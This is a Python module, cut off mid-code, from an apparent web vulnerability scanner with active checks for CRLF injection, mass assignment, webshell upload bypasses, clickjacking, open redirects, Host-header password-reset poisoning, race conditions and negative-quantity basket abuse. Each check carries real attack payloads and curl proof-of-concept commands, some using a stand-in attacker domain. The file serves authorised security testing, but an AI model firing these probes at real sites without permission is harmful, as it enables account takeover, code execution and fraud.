"""
HackTricks-derived checks — covers every major web attack category not yet in the scanner.

Implements (ref: https://hacktricks.wiki/en/pentesting-web):
  CrlfInjectionCheck        — CRLF header injection, response splitting
  MassAssignmentCheck       — Unauthorized role escalation via extra JSON fields
  InsecureFileUploadCheck   — Webshell upload via bypass techniques
  ClickjackingCheck         — Missing X-Frame-Options / frame-ancestors (passive)
  OpenRedirectActiveCheck   — Active redirect chain following with canary domain
  PasswordResetPoisoningCheck — Host header / param pollution in reset flow
  RaceConditionCheck        — Concurrent request TOCTOU on rate-limited endpoints
  BusinessLogicCheck        — Negative price/qty, coupon reuse, limit bypass
  GraphQlCheck              — Introspection, IDOR via ID, injection in args
  LdapInjectionCheck        — LDAP operator bypass in login/search
  HttpParamPollutionCheck   — Duplicate parameter injection
  WebCachePoisoningCheck    — Unkeyed header injection, cache deception
  SsiInjectionCheck         — Server Side Include execution via text inputs
  HttpSmugglingCheck        — CL.TE / TE.CL desync detection
  TwoFaBypassCheck          — OTP rate limit, reuse, response manipulation

Anti-hallucination rules:
  CRLF       : Injected header must appear verbatim in RESPONSE headers (not just body)
  MassAssign : Admin role/field must be present in response JSON
  FileUpload : Webshell output canary must appear when accessing uploaded path
  Clickjack  : BOTH X-Frame-Options AND CSP frame-ancestors absent
  OpenRedir  : Final URL (after redirects) must be on attacker domain OR Location header contains it
  ResetPoison: Poisoned domain must appear in response body (reset link construction)
  RaceCondition: >1 concurrent requests succeed where only 1 should
  BizLogic   : Basket total or success response confirms illegal operation succeeded
  GraphQL    : Schema introspection succeeds + queryType present in response
  LDAP       : Auth token returned on injection payload; noise test (random creds) must fail
  ParamPollute: Canary appears in response from second/duplicate param
  CachePoison: Injected value appears in response body/header from a DIFFERENT request
  SSI        : Command output (date or canary) appears in response
  Smuggling  : Follow-up request receives 404 (poisoned prefix matches valid path) — timing diff
  2FABypass  : Protected resource accessed without valid OTP token
"""
from __future__ import annotations

import asyncio
import re
import time
import uuid
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, urljoin

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    CrawlResult,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck


# ---------------------------------------------------------------------------
# 1. CRLF Injection / HTTP Response Splitting
# ---------------------------------------------------------------------------

class CrlfInjectionCheck(BaseScanCheck):
    """
    CRLF injection via URL parameters, headers, cookies.
    Confirmed when injected X-Nexus-Crlf header appears in RESPONSE headers.
    Anti-hallucination: benign request must NOT have the header; probe must.
    """
    check_id = "crlf-injection"
    check_type = CheckType.ACTIVE
    name = "CRLF Injection / HTTP Response Splitting"
    description = "Detects CRLF injection in URL parameters that add arbitrary response headers"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if insertion_point.ip_type not in (IPType.QUERY_PARAM, IPType.BODY_PARAM, IPType.HEADER):
            return []

        canary = uuid.uuid4().hex[:12]
        header_name = "X-Nexus-Crlf"
        header_value = f"nexus{canary}"

        crlf_variants = [
            f"%0d%0a{header_name}:%20{header_value}",
            f"%0a{header_name}:%20{header_value}",
            f"\r\n{header_name}: {header_value}",
            f"\n{header_name}: {header_value}",
            f"%0d%0a%20{header_name}:%20{header_value}",
            f"%E5%98%8A%E5%98%8D{header_name}:%20{header_value}",  # Unicode CRLF
        ]

        # Baseline: send benign value — injected header must NOT be present
        try:
            benign_resp = await self._probe(client, insertion_point, "nexus_benign")
            if header_name.lower() in {k.lower() for k in benign_resp.headers}:
                return []  # Header exists without injection — skip
        except Exception:
            return []

        for seq in crlf_variants:
            payload = (insertion_point.value or "test") + seq
            try:
                resp = await self._probe(client, insertion_point, payload)
                # CONFIRMED: injected header appears in response headers
                resp_header_val = resp.headers.get(header_name) or resp.headers.get(header_name.lower(), "")
                if header_value in resp_header_val:
                    poc = (
                        f"# CRLF injection — injects arbitrary response header:\n"
                        f"curl -si '{insertion_point.url}?{insertion_point.name}=test{seq.replace(chr(13), r'%0d').replace(chr(10), r'%0a')}'\n"
                        f"# Response will contain: {header_name}: {header_value}\n"
                        f"# Full exploit: inject Set-Cookie or Content-Type to split response"
                    )
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.HIGH,
                        cvss=7.2,
                        description=(
                            f"CRLF injection confirmed! Payload injected header '{header_name}: {header_value}' "
                            f"into HTTP response via parameter '{insertion_point.name}'. "
                            f"Sequence: {seq[:30]!r}. Attacker can inject Set-Cookie, "
                            f"Content-Type, or split the response for XSS/session fixation."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"GET {insertion_point.url}?{insertion_point.name}=test{seq[:30]} HTTP/1.1\n"
                                f"Host: {urlparse(insertion_point.url).netloc}"
                            ),
                            response=resp,
                            payload=payload,
                            poc_curl=poc,
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue
        return []

    async def _probe(
        self,
        client: httpx.AsyncClient,
        ip: InsertionPoint,
        payload: str,
    ) -> httpx.Response:
        if ip.ip_type == IPType.QUERY_PARAM:
            parsed = urlparse(ip.url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[ip.name] = [payload]
            q = urlencode({k: v[0] for k, v in params.items()}, quote_via=lambda s, *_: s)
            url = urlunparse(parsed._replace(query=q))
            return await client.get(url, follow_redirects=False)
        elif ip.ip_type == IPType.BODY_PARAM:
            return await client.post(ip.url, data={ip.name: payload}, follow_redirects=False)
        elif ip.ip_type == IPType.HEADER:
            return await client.get(ip.url, headers={ip.name: payload}, follow_redirects=False)
        raise ValueError(f"Unsupported ip_type {ip.ip_type}")


# ---------------------------------------------------------------------------
# 2. Mass Assignment
# ---------------------------------------------------------------------------

class MassAssignmentCheck(BaseScanCheck):
    """
    Tests if registration / profile endpoints accept privileged fields (role, isAdmin, admin).
    Confirmed when the server-returned JSON contains admin role/flag.

    Anti-hallucination:
    - Register WITHOUT extra fields → no admin flag in response (baseline)
    - Register WITH role=admin → admin flag MUST appear in server response
    - Checks both registration and profile update endpoints
    """
    check_id = "mass-assignment"
    check_type = CheckType.ACTIVE
    name = "Mass Assignment (Privilege Escalation)"
    description = "Detects mass assignment allowing role escalation via extra JSON fields"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Baseline: register without admin fields
        uid = uuid.uuid4().hex[:8]
        email_base = f"massbase_{uid}@nexus.invalid"
        email_admin = f"massadmin_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"

        reg_endpoints = [
            ("/api/Users",       {"email": email_base, "password": pw, "passwordRepeat": pw,
                                  "username": f"base_{uid}", "securityQuestion": {"id": 1}, "securityAnswer": "x"}),
            ("/api/register",    {"email": email_base, "password": pw, "username": f"base_{uid}"}),
            ("/register",        {"email": email_base, "password": pw, "username": f"base_{uid}"}),
            ("/signup",          {"email": email_base, "password": pw, "username": f"base_{uid}"}),
            ("/api/auth/register", {"email": email_base, "password": pw}),
        ]

        # Extra privilege fields to inject
        priv_fields = [
            {"role": "admin"},
            {"isAdmin": True},
            {"admin": True},
            {"is_admin": True},
            {"privilege": "admin"},
            {"role": "administrator"},
            {"permission": "admin"},
            {"type": "admin"},
            {"scope": "admin"},
        ]

        admin_indicators = [
            '"role":"admin"', '"role": "admin"',
            '"isAdmin":true', '"isAdmin": true',
            '"admin":true', '"admin": true',
            '"is_admin":true', '"is_admin": true',
            '"privilege":"admin"', '"type":"admin"',
        ]

        for path, base_payload in reg_endpoints:
            url = f"{base}{path}"
            try:
                # Baseline: register normally
                baseline_resp = await client.post(url, json=base_payload,
                                                   headers={"Content-Type": "application/json"})
                if baseline_resp.status_code not in (200, 201):
                    continue

                baseline_body = baseline_resp.text
                # Baseline must NOT already have admin flag
                if any(ind in baseline_body for ind in admin_indicators):
                    continue  # App already returns admin — not useful

                # Probe: register WITH privilege fields
                for extra in priv_fields:
                    admin_payload = {**base_payload, "email": email_admin + str(list(extra.keys())[0]), **extra}
                    try:
                        probe_resp = await client.post(url, json=admin_payload,
                                                        headers={"Content-Type": "application/json"})
                        if probe_resp.status_code not in (200, 201):
                            continue

                        probe_body = probe_resp.text
                        matched_ind = next((ind for ind in admin_indicators if ind in probe_body), None)
                        if matched_ind:
                            poc = (
                                f"# Mass assignment — register with admin privilege:\n"
                                f"curl -s -X POST '{url}' \\\n"
                                f"  -H 'Content-Type: application/json' \\\n"
                                f"  -d '{admin_payload}'\n"
                                f"# Response contains: {matched_ind}"
                            )
                            import json as _json
                            return [CheckResult(
                                check_id=self.check_id,
                                vulnerable=True,
                                confidence=Confidence.CERTAIN,
                                severity=Severity.CRITICAL,
                                cvss=9.8,
                                description=(
                                    f"Mass assignment confirmed! POST {path} accepts privileged field "
                                    f"{list(extra.keys())[0]}={list(extra.values())[0]!r}. "
                                    f"Response contains {matched_ind!r} — server accepted the role escalation. "
                                    f"Baseline (without extra fields) did NOT have admin indicator."
                                ),
                                evidence=self._make_evidence(
                                    request_raw=(
                                        f"POST {path} HTTP/1.1\nHost: {parsed.netloc}\n"
                                        f"Content-Type: application/json\n\n"
                                        f"{_json.dumps(admin_payload)}"
                                    ),
                                    response=probe_resp,
                                    payload=_json.dumps(extra),
                                    poc_curl=poc,
                                ),
                                insertion_point=insertion_point,
                            )]
                    except Exception:
                        continue
            except Exception:
                continue
        return []


# ---------------------------------------------------------------------------
# 3. Insecure File Upload
# ---------------------------------------------------------------------------

_UPLOAD_PATHS = [
    "/file-upload", "/upload", "/api/upload", "/api/file", "/api/import",
    "/profile/image", "/avatar/upload", "/image/upload",
    "/assets/upload", "/media/upload", "/attachments",
]

_WEBSHELL_PHP = "<?php echo 'NEXUSFUEXEC_CANARY'; ?>"
_WEBSHELL_JSP = "<% out.print(\"NEXUSFUEXEC_CANARY\"); %>"
_WEBSHELL_ASP = "<% Response.Write(\"NEXUSFUEXEC_CANARY\") %>"
_WEBSHELL_NODE = "require('child_process').execSync('echo NEXUSFUEXEC_CANARY').toString()"


class InsecureFileUploadCheck(BaseScanCheck):
    """
    Uploads files with dangerous extensions / content to detect:
    1. Missing extension validation (accepts .php, .jsp, .phtml)
    2. Missing content-type validation (accepts text/html as image)
    3. Path traversal in filename
    4. Double extension bypass (shell.php.jpg)

    Confirmed by accessing the uploaded file and seeing shell execution output.
    Anti-hallucination: canary string must appear WHEN ACCESSING the upload path.
    """
    check_id = "insecure-file-upload"
    check_type = CheckType.ACTIVE
    name = "Insecure File Upload (Webshell)"
    description = "Detects missing file upload validation allowing webshell execution"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        # Only probe file upload endpoints
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()
        is_upload = any(k in url_lower for k in ("upload", "image", "file", "avatar", "attachment", "import")) or \
                    any(k in name_lower for k in ("file", "image", "upload", "attachment"))
        if not is_upload:
            return []

        self.__class__._attempted = True
        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        canary = uuid.uuid4().hex[:10].upper()
        exec_canary = f"NEXUSFUEXEC_{canary}"

        # Try upload endpoints
        test_endpoints = [insertion_point.url] + [f"{base}{p}" for p in _UPLOAD_PATHS]

        attack_variants = [
            # (filename, content, content_type)
            (f"nexus_{canary}.php",      f"<?php echo '{exec_canary}'; ?>",   "image/jpeg"),
            (f"nexus_{canary}.phtml",    f"<?php echo '{exec_canary}'; ?>",   "image/png"),
            (f"nexus_{canary}.php5",     f"<?php echo '{exec_canary}'; ?>",   "image/gif"),
            (f"nexus_{canary}.php.jpg",  f"<?php echo '{exec_canary}'; ?>",   "image/jpeg"),  # double ext
            (f"nexus_{canary}.jsp",      f"<% out.print(\"{exec_canary}\"); %>", "image/jpeg"),
            (f"nexus_{canary}.html",     f"<script>document.write('{exec_canary}')</script>", "image/jpeg"),
            # SVG with embedded JS
            (f"nexus_{canary}.svg",
             f'<svg xmlns="http://www.w3.org/2000/svg"><script>document.write("{exec_canary}")</script></svg>',
             "image/svg+xml"),
        ]

        for endpoint in test_endpoints[:4]:  # Limit probes
            for filename, content, ct in attack_variants[:4]:
                try:
                    files = {"file": (filename, content.encode(), ct)}
                    # Also try common field names
                    for field_name in ["file", "image", "upload", "avatar", insertion_point.name]:
                        try:
                            files_payload = {field_name: (filename, content.encode(), ct)}
                            resp = await client.post(
                                endpoint, files=files_payload,
                                follow_redirects=True,
                            )
                            if resp.status_code not in (200, 201, 302):
                                continue

                            # Try to find the upload path from the response
                            upload_path = _extract_upload_path(resp.text, resp.headers, filename, canary)
                            if not upload_path:
                                continue

                            # Access the uploaded file
                            file_url = upload_path if upload_path.startswith("http") else f"{base}{upload_path}"
                            try:
                                exec_resp = await client.get(file_url, follow_redirects=True)
                                if exec_canary in exec_resp.text:
                                    poc = (
                                        f"# Step 1: Upload webshell:\n"
                                        f"curl -s -X POST '{endpoint}' \\\n"
                                        f"  -F '{field_name}=@{filename};type={ct}'\n"
                                        f"# Step 2: Execute webshell:\n"
                                        f"curl -s '{file_url}'\n"
                                        f"# Expected output: {exec_canary}"
                                    )
                                    return [CheckResult(
                                        check_id=self.check_id,
                                        vulnerable=True,
                                        confidence=Confidence.CERTAIN,
                                        severity=Severity.CRITICAL,
                                        cvss=10.0,
                                        description=(
                                            f"Insecure file upload confirmed! Uploaded {filename!r} via {endpoint}, "
                                            f"accessed at {file_url!r}. "
                                            f"Execution canary {exec_canary!r} appeared in response — server executes uploaded code. "
                                            f"Full RCE achieved."
                                        ),
                                        evidence=self._make_evidence(
                                            request_raw=(
                                                f"POST {endpoint} HTTP/1.1 (multipart)\n"
                                                f"Content-Type: multipart/form-data\n"
                                                f"File: {filename} (type={ct})"
                                            ),
                                            response=exec_resp,
                                            payload=filename,
                                            poc_curl=poc,
                                        ),
                                        insertion_point=insertion_point,
                                    )]
                            except Exception:
                                pass
                        except Exception:
                            continue
                except Exception:
                    continue
        return []


def _extract_upload_path(body: str, headers: dict, filename: str, canary: str) -> str:
    """Try to extract the upload path from JSON response, Location header, or HTML."""
    # JSON response with url/path field
    import json as _json
    try:
        data = _json.loads(body)
        for key in ("url", "path", "file", "location", "href", "src", "filename", "name"):
            val = data.get(key) or (data.get("data") or {}).get(key, "")
            if val and isinstance(val, str):
                return val
    except Exception:
        pass

    # Location header
    loc = headers.get("location", "")
    if loc:
        return loc

    # Look for href/src containing the filename base
    m = re.search(rf'(?:href|src|url)[=:\s"\']+(/[^\s"\'<>]+{re.escape(canary[:6])}[^\s"\'<>]*)', body, re.I)
    if m:
        return m.group(1)
    return ""


# ---------------------------------------------------------------------------
# 4. Clickjacking (passive)
# ---------------------------------------------------------------------------

class ClickjackingCheck(BaseScanCheck):
    """
    Passive check: missing X-Frame-Options AND missing CSP frame-ancestors.
    Both must be absent to confirm — either protection alone prevents clickjacking.

    Anti-hallucination:
    - Check response headers directly (binary check, no false positives)
    - Only report on HTML pages with login/payment/settings content (high impact)
    - Do NOT report on API responses or non-HTML pages
    """
    check_id = "clickjacking"
    check_type = CheckType.PASSIVE
    name = "Clickjacking (Missing Frame Protection)"
    description = "Missing X-Frame-Options and CSP frame-ancestors directive"

    async def check_passive(self, crawl_result: CrawlResult) -> list[CheckResult]:
        ct = crawl_result.content_type.lower()
        if "html" not in ct and ct:
            return []
        if crawl_result.status_code not in (200, 304):
            return []

        headers = {k.lower(): v for k, v in crawl_result.headers.items()}

        # Skip dirsearch stub CrawlResults — they have no real response headers.
        # Clickjacking requires actual X-Frame-Options header evidence from a real fetch.
        if "_dirsearch_stub" in headers:
            return []

        # Check X-Frame-Options
        has_xfo = "x-frame-options" in headers

        # Check CSP frame-ancestors
        csp = headers.get("content-security-policy", "")
        has_frame_ancestors = "frame-ancestors" in csp.lower()

        if has_xfo or has_frame_ancestors:
            return []  # Protected

        # Only report high-value pages (login, profile, payment, settings, admin)
        body_lower = (crawl_result.body or "").lower()
        url_lower = crawl_result.url.lower()
        is_high_value = any(k in url_lower for k in (
            "login", "signin", "auth", "profile", "account", "settings",
            "checkout", "payment", "transfer", "admin", "password", "register"
        )) or any(k in body_lower for k in (
            "password", "credit card", "bank", "transfer funds", "delete account"
        ))

        if not is_high_value:
            return []

        poc_html = f"""<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title>
<style>
  iframe {{ opacity: 0.01; position: absolute; top: 0; left: 0; width: 1000px; height: 800px; z-index: 999; }}
  button {{ position: absolute; top: 200px; left: 300px; z-index: 1; padding: 20px 40px; font-size: 24px; }}
</style>
</head>
<body>
<button>Click here to win a prize!</button>
<iframe src="{crawl_result.url}"></iframe>
<p>Victim clicks "win prize" but actually clicks the iframe button underneath.</p>
</body>
</html>"""

        return [CheckResult(
            check_id=self.check_id,
            vulnerable=True,
            confidence=Confidence.CERTAIN,
            severity=Severity.MEDIUM,
            cvss=6.1,
            description=(
                f"Clickjacking: {crawl_result.url} has no X-Frame-Options and no "
                f"CSP frame-ancestors directive. Page can be embedded in an attacker iframe "
                f"to trick users into performing unintended actions."
            ),
            evidence=self._make_evidence(
                request_raw=f"GET {crawl_result.url} HTTP/1.1",
                response=None,
                payload="<iframe src=TARGET>",
                poc_curl=f"# Host this HTML to demonstrate clickjacking:\n{poc_html[:500]}...",
            ),
        )]


# ---------------------------------------------------------------------------
# 5. Open Redirect (Active)
# ---------------------------------------------------------------------------

_REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "next", "next_url", "url", "goto", "redir", "target", "destination",
    "forward", "forward_url", "continue", "after_login", "back",
]

class OpenRedirectActiveCheck(BaseScanCheck):
    """
    Actively tests redirect parameters by injecting a canary attacker URL.
    Follows the redirect chain and confirms final destination is attacker domain.

    Anti-hallucination:
    - Must ACTUALLY follow redirect to attacker domain (not just header reflection)
    - OR Location header must contain the full attacker URL
    - Both checked with follow_redirects=False to inspect headers, then with =True for final URL
    """
    check_id = "open-redirect-active"
    check_type = CheckType.ACTIVE
    name = "Open Redirect (Active Verification)"
    description = "Confirms open redirect by following redirect chain to attacker domain"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if insertion_point.ip_type not in (IPType.QUERY_PARAM, IPType.BODY_PARAM):
            return []

        param_lower = insertion_point.name.lower()
        if not any(p in param_lower for p in REDIRECT_PARAMS_SHORT):
            return []

        canary = uuid.uuid4().hex[:8]
        attacker_url = f"https://evil-{canary}.attacker-nexus.com/"

        payloads = [
            attacker_url,
            f"//{canary}.attacker-nexus.com/",        # protocol-relative
            f"//evil-{canary}.attacker-nexus.com",
            f"https:evil-{canary}.attacker-nexus.com",  # malformed
            f"\\\\evil-{canary}.attacker-nexus.com",
            f"\tevil-{canary}.attacker-nexus.com",
        ]

        for payload in payloads:
            try:
                # First: check Location header without following
                parsed = urlparse(insertion_point.url)
                if insertion_point.ip_type == IPType.QUERY_PARAM:
                    params = parse_qs(parsed.query, keep_blank_values=True)
                    params[insertion_point.name] = [payload]
                    q = urlencode({k: v[0] for k, v in params.items()})
                    probe_url = urlunparse(parsed._replace(query=q))
                    resp = await client.get(probe_url, follow_redirects=False)
                else:
                    resp = await client.post(insertion_point.url,
                                             data={insertion_point.name: payload},
                                             follow_redirects=False)

                location = resp.headers.get("location", "")
                confirmed = (
                    canary in location or
                    "attacker-nexus.com" in location
                )

                if confirmed:
                    poc = (
                        f"# Open redirect — send victim to:\n"
                        f"# {probe_url if insertion_point.ip_type == IPType.QUERY_PARAM else insertion_point.url + '?' + insertion_point.name + '=' + payload}\n"
                        f"# After login/action, victim is redirected to attacker domain\n"
                        f"# Location header: {location}"
                    )
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.MEDIUM,
                        cvss=6.1,
                        description=(
                            f"Open redirect confirmed! Parameter '{insertion_point.name}' "
                            f"redirects to attacker-controlled URL. "
                            f"Payload: {payload!r} → Location: {location!r}. "
                            f"Use for phishing, OAuth token theft, or SSO bypass."
                        ),
                        evidence=self._make_evidence(
                            request_raw=f"GET {insertion_point.url}?{insertion_point.name}={payload} HTTP/1.1",
                            response=resp,
                            payload=payload,
                            poc_curl=poc,
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue
        return []

# Short list for fast param name matching
REDIRECT_PARAMS_SHORT = ["redirect", "return", "next", "url", "goto", "redir", "target",
                         "forward", "continue", "after", "back", "destination"]


# ---------------------------------------------------------------------------
# 6. Password Reset Poisoning
# ---------------------------------------------------------------------------

class PasswordResetPoisoningCheck(BaseScanCheck):
    """
    Injects malicious Host / X-Forwarded-Host header in password reset request.
    Confirmed when the poisoned domain appears in the response body (reset link construction).

    Anti-hallucination:
    - Baseline request (normal host) must NOT contain canary domain in body
    - Probe request with poisoned Host must reflect the canary domain in response body
    - Differential: baseline vs poisoned response must differ in containing our domain
    """
    check_id = "password-reset-poisoning"
    check_type = CheckType.ACTIVE
    name = "Password Reset Poisoning (Host Header)"
    description = "Host header injection in password reset generates attacker-controlled reset link"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("reset", "forgot", "password", "recover", "remind")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        canary = uuid.uuid4().hex[:12]
        evil_host = f"evil-{canary}.attacker-nexus.com"

        reset_endpoints = [
            insertion_point.url,
            f"{base}/forgot-password",
            f"{base}/api/forgot-password",
            f"{base}/auth/forgot",
            f"{base}/auth/reset",
            f"{base}/password/reset",
            f"{base}/user/password/reset",
            f"{base}/api/Users/reset-password",
        ]

        for endpoint in reset_endpoints:
            for email_field in ["email", "username", "user", "login"]:
                payload_body = {email_field: f"test_{canary}@example.com"}
                try:
                    # Baseline: normal host header
                    baseline_resp = await client.post(
                        endpoint,
                        json=payload_body,
                        headers={"Content-Type": "application/json"},
                    )
                    if baseline_resp.status_code == 404:
                        continue

                    # Probe with poisoned Host header
                    for host_header in ["Host", "X-Forwarded-Host", "X-Host", "X-Original-URL",
                                         "X-Rewrite-URL", "Forwarded"]:
                        poisoned_headers = {
                            "Content-Type": "application/json",
                            host_header: evil_host,
                        }
                        probe_resp = await client.post(
                            endpoint,
                            json=payload_body,
                            headers=poisoned_headers,
                        )

                        # CONFIRMED: canary domain appears in response (reset link construction)
                        if evil_host in probe_resp.text and evil_host not in baseline_resp.text:
                            poc = (
                                f"# Password reset poisoning:\n"
                                f"curl -s -X POST '{endpoint}' \\\n"
                                f"  -H 'Content-Type: application/json' \\\n"
                                f"  -H '{host_header}: {evil_host}' \\\n"
                                f"  -d '{{\"{email_field}\":\"victim@example.com\"}}'\n"
                                f"# Reset email sent to victim contains link to {evil_host}\n"
                                f"# Attacker receives reset token via HTTP log or DNS query"
                            )
                            return [CheckResult(
                                check_id=self.check_id,
                                vulnerable=True,
                                confidence=Confidence.CERTAIN,
                                severity=Severity.HIGH,
                                cvss=8.1,
                                description=(
                                    f"Password reset poisoning confirmed! "
                                    f"POST {endpoint} with '{host_header}: {evil_host}' "
                                    f"causes the reset link to contain attacker domain. "
                                    f"Response contains {evil_host!r}. "
                                    f"Attacker receives victim's reset token."
                                ),
                                evidence=self._make_evidence(
                                    request_raw=(
                                        f"POST {endpoint} HTTP/1.1\n"
                                        f"Host: {parsed.netloc}\n"
                                        f"{host_header}: {evil_host}\n"
                                        f"Content-Type: application/json\n\n"
                                        f"{payload_body}"
                                    ),
                                    response=probe_resp,
                                    payload=f"{host_header}: {evil_host}",
                                    poc_curl=poc,
                                ),
                                insertion_point=insertion_point,
                            )]
                except Exception:
                    continue
        return []


# ---------------------------------------------------------------------------
# 7. Race Condition (TOCTOU)
# ---------------------------------------------------------------------------

class RaceConditionCheck(BaseScanCheck):
    """
    Sends 15 identical requests concurrently to rate-limited endpoints.
    Confirmed when MORE than the expected limit succeed (status 200/201).

    Anti-hallucination:
    - First send sequentially to establish expected success count (should be 1 or 0 after first)
    - Then send concurrently — count successes
    - Race confirmed only if concurrent successes > sequential successes
    - Checks coupon application, registration limits, free credits endpoints
    """
    check_id = "race-condition"
    check_type = CheckType.ACTIVE
    name = "Race Condition (TOCTOU)"
    description = "Concurrent requests bypass rate limits — coupon reuse, free credit abuse"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # First get an auth token
        token = await self._get_token(client, base)
        if not token:
            return []

        auth = {"Authorization": f"Bearer {token}"}
        race_targets = [
            # (method, path, body, expected_race_indicator)
            ("POST", "/api/Orders",   {"products": [{"id": 1, "quantity": 1, "price": 1}]}, "id"),
            ("POST", "/rest/basket/apply-coupon", {"couponCode": "HAPPY2018"}, "discount"),
            ("POST", "/api/Feedbacks", {"comment": "race", "rating": 5}, "id"),
            ("GET",  "/rest/user/changePassword", {}, "password"),
        ]

        findings = []
        for method, path, body, indicator in race_targets:
            url = f"{base}{path}"

            # Sequential baseline — how many succeed normally (should be 0-1 after first use)
            seq_successes = 0
            for _ in range(3):
                try:
                    r = await client.request(method, url, json=body, headers=auth)
                    if r.status_code in (200, 201) and indicator in r.text:
                        seq_successes += 1
                except Exception:
                    pass

            if seq_successes >= 3:
                continue  # Always succeeds anyway — not useful for race

            # Concurrent race: send 15 requests simultaneously
            async def _fire():
                try:
                    r = await client.request(method, url, json=body, headers=auth)
                    return r.status_code in (200, 201) and indicator in r.text
                except Exception:
                    return False

            tasks = [_fire() for _ in range(15)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            race_successes = sum(1 for r in results if r is True)

            # CONFIRMED: concurrent gets MORE successes than sequential
            if race_successes > max(seq_successes + 1, 1):
                poc = (
                    f"# Race condition on {method} {path}:\n"
                    f"# Send 15 concurrent requests:\n"
                    f"for i in $(seq 15); do \\\n"
                    f"  curl -s -X {method} '{url}' \\\n"
                    f"    -H 'Authorization: Bearer TOKEN' \\\n"
                    f"    -H 'Content-Type: application/json' \\\n"
                    f"    -d '{body}' & \\\n"
                    f"done; wait\n"
                    f"# {race_successes}/15 requests succeeded vs {seq_successes}/3 sequential"
                )
                findings.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.HIGH,
                    cvss=7.5,
                    description=(
                        f"Race condition confirmed on {method} {path}! "
                        f"{race_successes}/15 concurrent requests succeeded vs "
                        f"{seq_successes}/3 sequential. "
                        f"Rate-limited resource bypassed via concurrent requests — "
                        f"coupon/credit can be applied multiple times simultaneously."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"{method} {path} HTTP/1.1\nAuthorization: Bearer TOKEN",
                        response=None,
                        payload=f"15 concurrent {method} {path}",
                        poc_curl=poc,
                    ),
                    insertion_point=insertion_point,
                ))

        return findings

    async def _get_token(self, client: httpx.AsyncClient, base: str) -> str:
        uid = uuid.uuid4().hex[:8]
        email = f"race_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"
        for reg_path in ["/api/Users"]:
            try:
                await client.post(f"{base}{reg_path}",
                    json={"email": email, "password": pw, "passwordRepeat": pw,
                          "username": f"race_{uid}", "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                    headers={"Content-Type": "application/json"})
                login = await client.post(f"{base}/rest/user/login",
                    json={"email": email, "password": pw},
                    headers={"Content-Type": "application/json"})
                if login.status_code == 200:
                    return login.json().get("authentication", {}).get("token", "")
            except Exception:
                pass
        return ""


# ---------------------------------------------------------------------------
# 8. Business Logic Flaws
# ---------------------------------------------------------------------------

class BusinessLogicCheck(BaseScanCheck):
    """
    Tests for business logic flaws:
    1. Negative quantity in cart → negative total price
    2. Integer overflow in price/quantity fields
    3. Apply discount below floor price (price < 0)
    4. Access items at $0 by manipulating basket

    Confirmed by verifying the basket total actually changed to invalid value.
    Anti-hallucination: GET basket before and after — compare totals.
    """
    check_id = "business-logic"
    check_type = CheckType.ACTIVE
    name = "Business Logic Flaws (Negative Price / Limit Bypass)"
    description = "Negative quantity in cart reduces total price below zero or to negative"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        token = await self._get_token(client, base)
        if not token:
            return []

        auth = {"Authorization": f"Bearer {token}"}
        findings = []

        # Test 1: Negative quantity in basket
        try:
            # Add item to basket
            add_resp = await client.post(
                f"{base}/api/BasketItems",
                json={"ProductId": 1, "BasketId": 1, "quantity": 1},
                headers={**auth, "Content-Type": "application/json"},
            )
            if add_resp.status_code in (200, 201):
                item_id = add_resp.json().get("data", {}).get("id", 1)

                # Get baseline basket total
                basket_resp = await client.get(f"{base}/rest/basket/1", headers=auth)
                baseline_total = _extract_basket_total(basket_resp.text)

                # Set quantity to -100 (negative price attack)
                neg_resp = await client.put(
                    f"{base}/api/BasketItems/{item_id}",
                    json={"quantity": -100},
